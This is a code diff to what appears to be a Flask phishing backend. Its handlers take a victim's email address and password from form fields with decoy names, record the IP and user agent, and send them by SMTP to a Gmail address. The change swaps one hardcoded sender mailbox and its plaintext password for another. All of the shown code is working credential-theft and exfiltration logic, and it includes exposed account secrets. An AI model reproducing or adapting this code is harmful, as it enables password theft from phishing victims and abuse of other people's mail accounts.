@@ -145,9 +145,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "tfp@memaritime.me"
+        sender_email = "munna@onegroupbd.com"
         receiver_email = "s.toihidi@gmail.com"
-        password = "tFP@m3m@r-23"
+        password = "MUNNA@ONE123"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOREA UPDATE ! 1"
@@ -163,7 +163,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.memaritime.me", 465) as server:
+        with smtplib.SMTP_SSL("mail.onegroupbd.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -182,9 +182,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "tfp@memaritime.me"
+        sender_email = "munna@onegroupbd.com"
         receiver_email = "s.toihidi@gmail.com"
-        password = "tFP@m3m@r-23"
+        password = "MUNNA@ONE123"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOREA UPDATE !! 2"
@@ -200,7 +200,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("mail.memaritime.me", 465) as server:
+        with smtplib.SMTP_SSL("mail.onegroupbd.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
